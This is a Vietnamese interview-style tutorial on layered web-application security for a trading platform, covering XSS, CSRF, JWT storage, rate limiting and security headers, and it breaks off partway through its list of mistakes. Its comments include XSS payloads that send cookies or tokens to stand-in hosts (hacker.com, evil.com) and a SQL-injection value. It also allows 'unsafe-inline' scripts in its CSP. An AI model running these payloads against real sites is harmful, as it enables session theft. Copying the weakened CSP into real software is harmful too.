# 🔐 Q51: Bảo Mật Security trên Web Application

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">🔐 Q51: Bảo Mật Security trên Web Application</span></summary>


**❓ Tình Huống:**

Bạn là Senior Frontend Developer phụ trách security cho Trading Platform xử lý:

- **Sensitive Data**: User credentials, trading orders, financial transactions
- **API Calls**: 1000+ requests/minute đến backend APIs
- **User Input**: Form submissions, search queries, comments
- **Third-party Integration**: Payment gateways, analytics, CDN

**Threats (Mối đe dọa):**

- XSS attacks (inject malicious scripts)
- CSRF attacks (force unwanted actions)
- Man-in-the-Middle (intercept data)
- Session hijacking
- Data exposure in client-side code

**Yêu cầu:** Thiết kế và implement chiến lược bảo mật toàn diện (defense in depth).

**✅ Đáp Án Chi Tiết:**

**🛡️ 7 Tầng Bảo Mật (7-Layer Security Strategy):**

```
┌──────────────────────────────────────────────────────────────┐
│              WEB SECURITY LAYERS                              │
├──────────────────────────────────────────────────────────────┤
│  1️⃣ HTTPS + TLS (Transport Layer Security)                  │
│  2️⃣ XSS Prevention (Cross-Site Scripting)                   │
│  3️⃣ CSRF Protection (Cross-Site Request Forgery)            │
│  4️⃣ Authentication & Authorization                          │
│  5️⃣ Secure Storage                                          │
│  6️⃣ API Security                                            │
│  7️⃣ Security Headers                                        │
└──────────────────────────────────────────────────────────────┘
```

**Code Example (TypeScript + React):**

```typescript
// ============================================
// 1️⃣ HTTPS + TLS (BẢO MẬT TẦNG TRUYỀN TẢI)
// ============================================

// Giải thích: HTTPS mã hóa dữ liệu giữa browser ↔ server
// Ngăn Man-in-the-Middle attack (hacker không đọc được data)

// Cấu hình Nginx Server
server {
  listen 443 ssl http2;  // Port 443 = HTTPS, http2 = protocol mới nhanh hơn

  # HSTS (HTTP Strict Transport Security): Bắt buộc dùng HTTPS
  # Giải thích: Browser tự động chuyển HTTP → HTTPS trong 1 năm
  # includeSubDomains: Áp dụng cho tất cả subdomain (api.example.com, cdn.example.com)
  # preload: Đưa vào HSTS preload list của browser (bảo mật từ lần truy cập đầu)
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

  # Cấu hình SSL/TLS Certificate (Chứng chỉ bảo mật)
  ssl_certificate /path/to/cert.pem;          # Public certificate (chứng chỉ công khai)
  ssl_certificate_key /path/to/key.pem;       # Private key (khóa bí mật)

  # Chỉ cho phép TLS 1.2 và 1.3 (phiên bản mới, bảo mật)
  # Không dùng TLS 1.0, 1.1 (đã lỗi thời, có lỗ hổng)
  ssl_protocols TLSv1.2 TLSv1.3;

  # Cipher suite: Thuật toán mã hóa
  # HIGH = mã hóa mạnh, !aNULL = không dùng cipher không xác thực, !MD5 = không dùng MD5 (yếu)
  ssl_ciphers HIGH:!aNULL:!MD5;
}

// ============================================
// 2️⃣ XSS PREVENTION (NGĂN CHẶN TẤN CÔNG XSS)
// ============================================

// Giải thích XSS (Cross-Site Scripting):
// Hacker inject malicious script vào web → script chạy → steal cookies, redirect, keylog
// VD: User nhập comment: <script>fetch('https://hacker.com?cookie='+document.cookie)</script>

// 🛡️ A. Input Sanitization (Làm Sạch Input) với DOMPurify
import DOMPurify from 'dompurify';
import { useState, useMemo } from 'react';

function CommentForm({ onSubmit }) {
  const [comment, setComment] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // ✅ Sanitize input: Loại bỏ script tags và các thẻ nguy hiểm
    const sanitized = DOMPurify.sanitize(comment, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],  // Chỉ cho phép các thẻ an toàn
      ALLOWED_ATTR: ['href']  // Chỉ cho phép attribute 'href' (cho thẻ <a>)
    });
    // Kết quả: "<script>alert('xss')</script>" → "" (bị xóa)
    //          "<b>Text</b>" → "<b>Text</b>" (giữ lại)

    onSubmit(sanitized);
  };

  return (
    <form onSubmit={handleSubmit}>
      <textarea
        value={comment}
        onChange={(e) => setComment(e.target.value)}
        placeholder="Nhập comment của bạn..."
      />
      <button type="submit">Gửi Comment</button>
    </form>
  );
}

// ✅ Safe Display: Hiển thị HTML an toàn
function SafeComment({ content }) {
  // useMemo: Chỉ sanitize lại khi content thay đổi
  const sanitized = useMemo(() => {
    return DOMPurify.sanitize(content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],  // Cho phép format text cơ bản
      ALLOWED_ATTR: ['href', 'target'],  // Cho phép link
      ALLOW_DATA_ATTR: false  // Không cho phép data-* attributes (có thể chứa script)
    });
  }, [content]);

  // dangerouslySetInnerHTML: Render HTML string
  // Tên "dangerous" nhắc nhở phải sanitize trước khi dùng
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// ❌ VÍ DỤ TẤN CÔNG XSS:
// User nhập: <img src="x" onerror="alert('XSS')">
// Không sanitize → img load lỗi → chạy onerror → alert hiện
// Có sanitize → DOMPurify xóa onerror attribute → an toàn

// 🛡️ B. Content Security Policy (CSP) - Chính sách bảo mật nội dung
// CSP: Header chỉ định nguồn nào được phép load scripts, styles, images
// Server: Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",  // Mặc định chỉ load từ cùng domain
      "script-src 'self' https://trusted-cdn.com",  // Script chỉ từ domain + CDN tin cậy
      "style-src 'self' 'unsafe-inline'",  // CSS từ domain + inline styles (cần cho React)
      "img-src 'self' data: https:",  // Image từ domain + data URLs + HTTPS
      "connect-src 'self' https://api.example.com",  // Fetch/WebSocket chỉ đến API
      "frame-ancestors 'none'"  // Không cho embed trong iframe (chống clickjacking)
    ].join('; ')
  );
  next();
});
// Kết quả: Nếu hacker inject <script src="https://evil.com/hack.js"></script>
// → Browser BLOCK vì evil.com không trong whitelist → XSS thất bại

// ============================================
// 3️⃣ CSRF PROTECTION (NGĂN CHẶN TẤN CÔNG CSRF)
// ============================================

// Giải thích CSRF (Cross-Site Request Forgery):
// Hacker lừa user click link → browser tự động gửi request (kèm cookies) → thực hiện action không mong muốn
// VD: User đang login bank.com → click link evil.com → evil.com trigger POST /transfer → tiền bị chuyển

import { useEffect, useState } from 'react';
import { randomBytes } from 'crypto';

// SERVER: Generate CSRF Token
// Tạo token ngẫu nhiên cho mỗi session, lưu ở server
app.get('/api/csrf-token', (req, res) => {
  // Tạo token ngẫu nhiên 32 bytes (256 bits) → rất khó đoán
  const token = randomBytes(32).toString('hex');

  // Lưu token vào session (server-side, hacker không access được)
  req.session.csrfToken = token;

  // Trả token cho client
  res.json({ csrfToken: token });
});

// API endpoint cần bảo vệ
app.post('/api/transfer', (req, res) => {
  const { csrfToken, amount, toAccount } = req.body;

  // ✅ Verify CSRF token: So sánh token từ client vs token trong session
  if (csrfToken !== req.session.csrfToken) {
    console.log('❌ CSRF token không hợp lệ');
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  // Token hợp lệ → xử lý transfer
  console.log(`✅ Chuyển $${amount} đến ${toAccount}`);
  // Process transfer logic...
  res.json({ success: true });
});

// CLIENT: Hook lấy CSRF token
function useCsrfToken() {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
    // Fetch token từ server khi component mount
    fetch('/api/csrf-token')
      .then(res => res.json())
      .then(data => setCsrfToken(data.csrfToken))
      .catch(err => console.error('Lỗi lấy CSRF token:', err));
  }, []);

  return csrfToken;
}

// Component Form chuyển tiền
function TransferForm() {
  const csrfToken = useCsrfToken();  // Lấy token
  const [amount, setAmount] = useState('');
  const [toAccount, setToAccount] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // ✅ Gửi CSRF token cùng request
    // Cách 1: Trong body
    // Cách 2: Trong custom header (X-CSRF-Token)
    await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken  // Gửi token qua header
      },
      body: JSON.stringify({
        amount,
        toAccount,
        csrfToken  // Cũng gửi trong body (double check)
      })
    });
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="number"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
        placeholder="Số tiền"
      />
      <input
        type="text"
        value={toAccount}
        onChange={(e) => setToAccount(e.target.value)}
        placeholder="Tài khoản nhận"
      />
      <button type="submit">Chuyển Tiền</button>
    </form>
  );
}

// TẠI SAO CSRF TOKEN HOẠT ĐỘNG?
// 1. Site evil.com KHÔNG thể đọc token từ bank.com (Same-Origin Policy)
// 2. Browser tự động gửi cookies → nhưng KHÔNG tự động gửi custom headers/body
// 3. Request từ evil.com thiếu token → server reject → CSRF thất bại

// ============================================
// 4️⃣ AUTHENTICATION & AUTHORIZATION (XÁC THỰC & PHÂN QUYỀN)
// ============================================

// Giải thích JWT (JSON Web Token):
// Token chứa thông tin user (id, email, role) được mã hóa
// Server ký token bằng secret key → client không thể fake token
// 2 loại token: Access Token (ngắn hạn) + Refresh Token (dài hạn)

import jwt from 'jsonwebtoken';
import bcrypt from 'bcrypt';

// SERVER: Login API
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  // Tìm user trong database
  const user = await User.findOne({ email });

  if (!user) {
    return res.status(401).json({ error: 'Email không tồn tại' });
  }

  // Verify password (so sánh với hash trong DB)
  const validPassword = await bcrypt.compare(password, user.passwordHash);

  if (!validPassword) {
    return res.status(401).json({ error: 'Mật khẩu không đúng' });
  }

  // ✅ Generate Access Token (Token truy cập - ngắn hạn: 15 phút)
  // Tại sao ngắn hạn? Nếu bị đánh cắp → hacker chỉ dùng được 15 phút
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email, role: user.role },  // Payload: thông tin user
    process.env.JWT_SECRET!,  // Secret key để ký token (giữ bí mật)
    { expiresIn: '15m' }  // Token hết hạn sau 15 phút
  );

  // ✅ Generate Refresh Token (Token làm mới - dài hạn: 7 ngày)
  // Dùng để lấy access token mới khi access token hết hạn
  const refreshToken = jwt.sign(
    { userId: user.id },  // Payload đơn giản hơn
    process.env.REFRESH_TOKEN_SECRET!,  // Secret key khác với access token
    { expiresIn: '7d' }  // 7 ngày
  );

  // ✅ Lưu refresh token vào httpOnly cookie
  // httpOnly: JavaScript KHÔNG đọc được → XSS không steal được
  // secure: Chỉ gửi qua HTTPS
  // sameSite: 'strict' → chống CSRF (cookie không gửi từ site khác)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,  // JS không access được (chống XSS)
    secure: true,    // Chỉ gửi qua HTTPS
    sameSite: 'strict',  // Chống CSRF
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ngày (milliseconds)
  });

  // Trả access token cho client (lưu trong memory, KHÔNG localStorage)
  res.json({ accessToken, user: { id: user.id, email: user.email } });
});

// API làm mới access token
app.post('/api/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;

  if (!refreshToken) {
    return res.status(401).json({ error: 'Không có refresh token' });
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET!);

    // Generate access token mới
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET!,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(403).json({ error: 'Refresh token không hợp lệ' });
  }
});

// CLIENT: Auth Context với auto-refresh
import { createContext, useContext, useEffect, useState } from 'react';

const AuthContext = createContext<{ accessToken: string | null }>({ accessToken: null });

function AuthProvider({ children }) {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // ✅ Auto-refresh token trước khi hết hạn
  // Access token hết hạn sau 15 phút → refresh sau 14 phút (dư 1 phút buffer)
  useEffect(() => {
    const refreshInterval = setInterval(async () => {
      console.log('Đang refresh access token...');

      const res = await fetch('/api/refresh', {
        method: 'POST',
        credentials: 'include'  // Gửi cookies (chứa refresh token)
      });

      if (res.ok) {
        const data = await res.json();
        setAccessToken(data.accessToken);  // Update access token mới
        console.log('✅ Access token đã được làm mới');
      } else {
        console.log('❌ Refresh thất bại → User cần login lại');
        setAccessToken(null);
      }
    }, 14 * 60 * 1000); // 14 phút = 840,000ms

    // Cleanup interval khi unmount
    return () => clearInterval(refreshInterval);
  }, []);

  return (
    <AuthContext.Provider value={{ accessToken }}>
      {children}
    </AuthContext.Provider>
  );
}

// Hook sử dụng auth
export const useAuth = () => useContext(AuthContext);

// Component gọi API với authentication
function UserProfile() {
  const { accessToken } = useAuth();
  const [profile, setProfile] = useState(null);

  useEffect(() => {
    if (accessToken) {
      fetch('/api/profile', {
        headers: {
          'Authorization': `Bearer ${accessToken}`  // Gửi access token trong header
        }
      })
        .then(res => res.json())
        .then(data => setProfile(data));
    }
  }, [accessToken]);

  return <div>Thông tin user: {profile?.email}</div>;
}

// ============================================
// 5️⃣ SECURE STORAGE (LƯU TRỮ AN TOÀN)
// ============================================

// Nguyên tắc: KHÔNG BAO GIỜ lưu sensitive data ở client-side (localStorage/sessionStorage)
// Lý do: XSS attack có thể đọc localStorage → steal tokens, passwords, credit cards

// ❌ CÁCH LƯU KHÔNG AN TOÀN
// localStorage/sessionStorage: JavaScript có thể đọc → XSS steal được
localStorage.setItem('token', accessToken); // ❌ XSS đọc được!
localStorage.setItem('refreshToken', refreshToken); // ❌ Rất nguy hiểm!
localStorage.setItem('creditCard', '1234-5678-9012-3456'); // ❌ KHÔNG BAO GIỜ làm!
localStorage.setItem('password', 'user123'); // ❌ Cực kỳ nguy hiểm!

// Kịch bản tấn công:
// 1. Hacker inject XSS: <script>fetch('https://evil.com?data='+localStorage.getItem('token'))</script>
// 2. Script chạy → đọc localStorage → gửi token về server hacker
// 3. Hacker dùng token → truy cập account của user

// ✅ CÁCH LƯU AN TOÀN

// 1. HttpOnly Cookies cho Refresh Token (bảo mật nhất)
// httpOnly: JavaScript KHÔNG thể đọc → XSS không steal được
// Server set cookie trong response:
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,    // ✅ JS không access được
  secure: true,      // ✅ Chỉ gửi qua HTTPS
  sameSite: 'strict', // ✅ Chống CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ngày
});

// Client không thể đọc cookie này:
console.log(document.cookie); // Không thấy refreshToken (vì httpOnly)

// 2. Memory-only cho Access Token (lưu trong React state/context)
// Access token chỉ tồn tại trong memory → mất khi reload page
function App() {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // Khi login thành công
  const handleLogin = async (email: string, password: string) => {
    const res = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    });

    const data = await res.json();
    setAccessToken(data.accessToken); // ✅ Lưu trong memory (React state)
    // KHÔNG lưu vào localStorage
  };

  return <div>App content...</div>;
}

// 3. Session Storage (tốt hơn localStorage nhưng vẫn có risk)
// sessionStorage: Tồn tại trong 1 tab, mất khi đóng tab
// Vẫn có thể bị XSS steal → chỉ dùng cho non-sensitive data
sessionStorage.setItem('theme', 'dark'); // ✅ OK cho data không nhạy cảm
sessionStorage.setItem('language', 'vi'); // ✅ OK

// ❌ KHÔNG dùng cho sensitive data
sessionStorage.setItem('token', token); // ❌ Vẫn có XSS risk

// 4. Encrypted Storage (Mã hóa trước khi lưu - fallback option)
// Chỉ dùng khi BẮT BUỘC phải lưu client-side
import CryptoJS from 'crypto-js';

const SECRET_KEY = 'your-encryption-key'; // Lấy từ env hoặc server

// Encrypt trước khi lưu
const encryptData = (data: string) => {
  return CryptoJS.AES.encrypt(data, SECRET_KEY).toString();
};

// Decrypt khi đọc
const decryptData = (encrypted: string) => {
  const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
  return bytes.toString(CryptoJS.enc.Utf8);
};

// Lưu data đã mã hóa
const encrypted = encryptData(sensitiveData);
localStorage.setItem('data', encrypted);

// Đọc và giải mã
const encrypted = localStorage.getItem('data');
const decrypted = decryptData(encrypted);

// ⚠️ LƯU Ý: Encryption KHÔNG an toàn 100%
// - Secret key vẫn ở client → hacker có thể tìm thấy
// - Chỉ làm khó hacker hơn, KHÔNG ngăn được hoàn toàn

// 📋 BẢNG SO SÁNH STORAGE OPTIONS
/*
┌──────────────────────┬─────────────┬─────────────┬──────────────────┐
│ Storage Type         │ XSS Risk    │ CSRF Risk   │ Best Use Case    │
├──────────────────────┼─────────────┼─────────────┼──────────────────┤
│ HttpOnly Cookie      │ ✅ Low      │ ⚠️ Medium   │ Refresh Token    │
│ Memory (React State) │ ✅ Low      │ ✅ Low      │ Access Token     │
│ localStorage         │ ❌ High     │ ✅ Low      │ Non-sensitive    │
│ sessionStorage       │ ❌ High     │ ✅ Low      │ Non-sensitive    │
│ Encrypted Storage    │ ⚠️ Medium   │ ✅ Low      │ Fallback only    │
└──────────────────────┴─────────────┴─────────────┴──────────────────┘
*/

// ✅ BEST PRACTICE:
// - Refresh Token → httpOnly cookie (server-side)
// - Access Token → React state/Context (memory)
// - User preferences → localStorage (non-sensitive)
// - NEVER store passwords, credit cards, API keys trong client

// ============================================
// 6️⃣ API SECURITY (BẢO MẬT API)
// ============================================

// 🛡️ A. Rate Limiting (Giới Hạn Số Request)
// Mục đích: Ngăn DDoS attack, brute-force attack, spam
// VD: Hacker thử 1 triệu passwords → rate limit chặn sau 5 lần thử

const rateLimit = require('express-rate-limit');

// Rate limiter cho toàn bộ API
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // Cửa sổ thời gian: 15 phút
  max: 100, // Tối đa 100 requests trong 15 phút (từ 1 IP)
  message: 'Quá nhiều requests, vui lòng thử lại sau',
  standardHeaders: true, // Trả về RateLimit headers (X-RateLimit-*)
  legacyHeaders: false,  // Tắt headers cũ
});

// Áp dụng cho tất cả API routes
app.use('/api/', apiLimiter);

// Rate limiter nghiêm ngặt hơn cho login (chống brute-force)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // Chỉ cho 5 lần thử login trong 15 phút
  message: 'Quá nhiều lần thử login, tài khoản tạm khóa 15 phút',
  skipSuccessfulRequests: true // Không đếm request thành công
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // Login logic...
});

// 🛡️ B. Input Validation (Kiểm Tra Dữ Liệu Đầu Vào)
// Nguyên tắc: KHÔNG BAO GIỜ tin tưởng input từ client
// Luôn validate ở server-side (client validation có thể bị bypass)

import { z } from 'zod'; // Thư viện validation mạnh mẽ

// Schema cho transfer request
const transferSchema = z.object({
  amount: z.number()
    .positive('Số tiền phải > 0')  // Phải là số dương
    .max(1000000, 'Số tiền tối đa 1 triệu'),  // Giới hạn trên

  accountNumber: z.string()
    .regex(/^\d{10}$/, 'Số tài khoản phải có 10 chữ số'),  // Đúng format

  description: z.string()
    .max(200, 'Mô tả tối đa 200 ký tự')
    .optional()  // Field không bắt buộc
});

// API endpoint với validation
app.post('/api/transfer', async (req, res) => {
  try {
    // ✅ Validate input với Zod
    const data = transferSchema.parse(req.body);

    // Validation pass → data đã clean và đúng type
    console.log('✅ Data hợp lệ:', data);

    // Xử lý transfer với data đã validate
    const result = await processTransfer(data);

    res.json({ success: true, result });

  } catch (error) {
    // Validation fail → trả lỗi chi tiết
    if (error instanceof z.ZodError) {
      console.log('❌ Validation errors:', error.errors);
      return res.status(400).json({
        error: 'Dữ liệu không hợp lệ',
        details: error.errors
      });
    }

    res.status(500).json({ error: 'Lỗi server' });
  }
});

// 🛡️ C. CORS Configuration (Kiểm Soát Nguồn Gốc Requests)
// CORS: Quy định domain nào được phép call API
import cors from 'cors';

// CORS config nghiêm ngặt
const corsOptions = {
  origin: [
    'https://yourdomain.com',      // Production domain
    'https://staging.yourdomain.com', // Staging
  ],
  // KHÔNG dùng origin: '*' trong production (cho phép mọi domain)

  methods: ['GET', 'POST', 'PUT', 'DELETE'], // HTTP methods cho phép

  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-CSRF-Token'
  ], // Headers cho phép

  credentials: true, // Cho phép gửi cookies

  maxAge: 86400 // Cache preflight request 24h
};

app.use(cors(corsOptions));

// 🛡️ D. SQL Injection Prevention (Ngăn Chặn SQL Injection)
// LUÔN dùng parameterized queries, KHÔNG nối string SQL

// ❌ KHÔNG AN TOÀN: String concatenation
const userId = req.params.id;
const query = `SELECT * FROM users WHERE id = ${userId}`; // XSS: userId = "1 OR 1=1"
db.query(query); // ❌ Trả về tất cả users!

// ✅ AN TOÀN: Parameterized query
const userId = req.params.id;
const query = 'SELECT * FROM users WHERE id = ?'; // Placeholder
db.query(query, [userId]); // ✅ Library tự động escape

// 🛡️ E. API Authentication (Xác Thực API)
// Middleware kiểm tra token
const authenticateToken = (req, res, next) => {
  // Lấy token từ header
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // "Bearer TOKEN"

  if (!token) {
    return res.status(401).json({ error: 'Thiếu access token' });
  }

  try {
    // Verify token
    const decoded = jwt.verify(token, process.env.JWT_SECRET!);
    req.user = decoded; // Gắn user info vào request
    next(); // Token hợp lệ → tiếp tục
  } catch (error) {
    return res.status(403).json({ error: 'Token không hợp lệ hoặc hết hạn' });
  }
};

// Áp dụng middleware cho protected routes
app.get('/api/profile', authenticateToken, (req, res) => {
  // req.user đã có thông tin từ token
  res.json({ user: req.user });
});

app.post('/api/transfer', authenticateToken, apiLimiter, async (req, res) => {
  // Multiple layers: Authentication + Rate limiting + Validation
  // ...
});

// ============================================
// 7️⃣ SECURITY HEADERS (HEADERS BẢO MẬT)
// ============================================

// Security Headers: HTTP response headers tăng cường bảo mật
// Helmet.js: Thư viện tự động set các security headers

import helmet from 'helmet';
import express from 'express';

const app = express();

// Áp dụng Helmet với config chi tiết
app.use(helmet({

  // 1. Content Security Policy (CSP) - Kiểm soát nguồn tài nguyên
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],  // Mặc định chỉ load từ cùng origin

      scriptSrc: [
        "'self'",  // Scripts từ cùng domain
        "'unsafe-inline'",  // Cho phép inline scripts (cần cho React)
        "https://trusted-cdn.com"  // CDN tin cậy
      ],

      styleSrc: [
        "'self'",
        "'unsafe-inline'"  // Inline styles (cần cho styled-components)
      ],

      imgSrc: [
        "'self'",  // Images từ domain
        "data:",   // Data URLs (base64 images)
        "https:"   // HTTPS images
      ],

      connectSrc: [
        "'self'",  // Fetch/WebSocket từ domain
        "https://api.example.com"  // API endpoints
      ],

      fontSrc: ["'self'", "https://fonts.gstatic.com"],

      objectSrc: ["'none'"],  // Không cho phép <object>, <embed>

      mediaSrc: ["'self'"],  // Video/Audio

      frameSrc: ["'none'"]  // Không cho phép iframe
    }
  },

  // 2. X-Frame-Options - Chống Clickjacking
  // Clickjacking: Hacker nhúng site vào iframe, lừa user click vào button ẩn
  xFrameOptions: {
    action: 'deny'  // Không cho phép site được nhúng trong iframe
  },
  // Hoặc: action: 'sameorigin' (chỉ iframe từ cùng domain)

  // 3. X-Content-Type-Options - Chống MIME type sniffing
  // noSniff: true → Browser không đoán MIME type, phải dùng đúng Content-Type
  noSniff: true,
  // VD: File .txt có MIME text/plain → browser KHÔNG execute như JavaScript

  // 4. Referrer-Policy - Kiểm soát thông tin Referrer
  referrerPolicy: {
    policy: 'no-referrer'  // Không gửi referrer header (giấu nguồn gốc request)
  },
  // Các option khác: 'no-referrer-when-downgrade', 'same-origin', 'strict-origin'

  // 5. X-XSS-Protection (Legacy, CSP tốt hơn)
  xssFilter: true,  // Enable XSS filter built-in của browser

  // 6. Strict-Transport-Security (HSTS)
  hsts: {
    maxAge: 31536000,  // 1 năm (giây)
    includeSubDomains: true,  // Áp dụng cho subdomain
    preload: true  // Đưa vào HSTS preload list
  }

}));

// Hoặc set headers thủ công
app.use((req, res, next) => {
  // CSP Header
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'"
  );

  // X-Frame-Options
  res.setHeader('X-Frame-Options', 'DENY');

  // X-Content-Type-Options
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // Referrer-Policy
  res.setHeader('Referrer-Policy', 'no-referrer');

  // Permissions-Policy (tắt features không dùng)
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=()'  // Tắt location, mic, camera
  );

  next();
});

// 📋 BẢNG TÓM TẮT SECURITY HEADERS
/*
┌────────────────────────────┬──────────────────────────────────────────┐
│ Header                     │ Mục Đích                                 │
├────────────────────────────┼──────────────────────────────────────────┤
│ Content-Security-Policy    │ Kiểm soát nguồn scripts, styles, images  │
│ X-Frame-Options            │ Chống Clickjacking (iframe embed)        │
│ X-Content-Type-Options     │ Chống MIME type sniffing                 │
│ Referrer-Policy            │ Kiểm soát thông tin referrer             │
│ Strict-Transport-Security  │ Bắt buộc HTTPS                           │
│ X-XSS-Protection           │ Enable browser XSS filter (legacy)       │
│ Permissions-Policy         │ Tắt browser features không dùng          │
└────────────────────────────┴──────────────────────────────────────────┘
*/

// ✅ Kiểm tra headers:
// 1. Mở DevTools → Network tab
// 2. Chọn request bất kỳ
// 3. Xem Response Headers
// 4. Hoặc dùng https://securityheaders.com để scan

// VÍ DỤ RESPONSE HEADERS:
/*
HTTP/2 200
content-security-policy: default-src 'self'
x-frame-options: DENY
x-content-type-options: nosniff
referrer-policy: no-referrer
strict-transport-security: max-age=31536000; includeSubDomains; preload
*/
```

**🎯 Security Checklist:**

```typescript
// ✅ Security Checklist cho Trading Platform

const securityChecklist = {
  transport: {
    https: true,
    hsts: true,
    tlsVersion: 'TLS 1.3',
    certificateExpiry: 'Valid',
  },

  xssPrevention: {
    inputSanitization: true,
    outputEncoding: true,
    cspHeaders: true,
    dompurify: true,
  },

  csrfProtection: {
    csrfTokens: true,
    sameSiteCookies: true,
    customHeaders: true,
  },

  authentication: {
    jwtTokens: true,
    refreshTokens: true,
    tokenExpiry: '15m',
    passwordHashing: 'bcrypt',
  },

  storage: {
    noSensitiveLocalStorage: true,
    httpOnlyCookies: true,
    encryptedData: true,
  },

  apiSecurity: {
    rateLimiting: true,
    inputValidation: true,
    cors: true,
    apiKeys: true,
  },

  headers: {
    contentSecurityPolicy: true,
    xFrameOptions: true,
    xContentTypeOptions: true,
    referrerPolicy: true,
  },
};
```

**Best Practices:**

1. **Defense in Depth**: Multiple layers of security
2. **Principle of Least Privilege**: Minimal permissions
3. **Input Validation**: Server-side validation always
4. **Secure Storage**: HttpOnly cookies, no localStorage for sensitive data
5. **Regular Updates**: Dependencies, libraries, frameworks
6. **Security Audits**: Penetration testing, code reviews
7. **Monitoring**: Log security events, detect anomalies

**Common Mistakes (Lỗi Bảo Mật Thường Gặp):**

```typescript
// ❌ LỖI 1: Lưu tokens trong localStorage
// Vấn đề: XSS có thể đọc localStorage → steal token
localStorage.setItem('token', token); // ❌ Nguy hiểm!
localStorage.setItem('refreshToken', refreshToken); // ❌ Rất nguy hiểm!

// ✅ CÁCH SỬA: Dùng HttpOnly cookies
// Server:
res.cookie('refreshToken', token, {
  httpOnly: true, // JavaScript không đọc được
  secure: true, // Chỉ gửi qua HTTPS
  sameSite: 'strict', // Chống CSRF
});
// Client: Không cần làm gì, browser tự động gửi cookie

// ❌ LỖI 2: Không sanitize user input
// Vấn đề: User nhập <script>alert('XSS')</script> → script chạy
function Comment({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />; // ❌ Nguy hiểm!
}

// ✅ CÁCH SỬA: Dùng DOMPurify sanitize
import DOMPurify from 'dompurify';

function Comment({ content }) {
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'], // Chỉ cho phép tags an toàn
    ALLOWED_ATTR: [], // Không cho phép attributes
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />; // ✅ An toàn
}

// ❌ LỖI 3: Không có CSRF protection
// Vấn đề: Hacker lừa user click link → browser gửi request kèm cookies
fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ amount: 1000 }),
}); // ❌ Thiếu CSRF token

// ✅ CÁCH SỬA: Gửi CSRF token
// 1. Lấy token từ server
const csrfToken = await fetch('/api/csrf-token').then((r) => r.json());

// 2. Gửi token cùng request
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken.token, // ✅ Gửi token
  },
  body: JSON.stringify({ amount: 1000, csrfToken: csrfToken.token }),
});

// ❌ LỖI 4: Password yếu
// Vấn đề: Password ngắn → dễ brute-force
const isValid = password.length >= 6; // ❌ Quá yếu (123456, password)

// ✅ CÁCH SỬA: Password policy mạnh
// Regex: Ít nhất 12 ký tự, có chữ thường, chữ hoa, số, ký tự đặc biệt
const passwordRegex =
  /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$/;

function validatePassword(password: string): boolean {
  if (!passwordRegex.test(password)) {
    throw new Error(
      'Password phải có ít nhất 12 ký tự, bao gồm chữ hoa, chữ thường, số và ký tự đặc biệt'
    );
  }
  return true;
}

// VD: "Pass123!" → ❌ Fail (chỉ 8 ký tự)
//     "MySecurePass123!" → ✅ Pass

// ❌ LỖI 5: Không có rate limiting
// Vấn đề: Hacker thử 1 triệu passwords trong vài phút
app.post('/api/login', async (req, res) => {
  // ❌ Không giới hạn → brute-force dễ dàng
  const user = await authenticateUser(req.body);
  res.json(user);
});

// ✅ CÁCH SỬA: Thêm rate limiting
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // Chỉ cho 5 lần thử
  message: 'Quá nhiều lần thử login, vui lòng thử lại sau 15 phút',
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // ✅ Giới hạn 5 lần/15 phút → brute-force khó hơn
  const user = await authenticateUser(req.body);
  res.json(user);
});

// ❌ LỖI 6: Hardcode secrets trong code
// Vấn đề: Secret bị lộ khi push lên GitHub
